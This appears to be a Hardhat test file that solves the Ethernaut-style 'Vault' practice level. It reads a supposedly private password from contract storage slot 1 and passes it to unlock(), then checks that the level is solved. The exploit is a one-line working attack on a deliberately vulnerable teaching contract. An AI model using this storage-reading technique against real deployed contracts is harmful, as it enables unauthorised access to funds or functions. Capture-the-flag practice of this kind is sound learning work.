const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Vault", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Vault", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Read "private" variable
        await instance.unlock(await ethers.provider.getStorageAt(instance.address, 1));
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});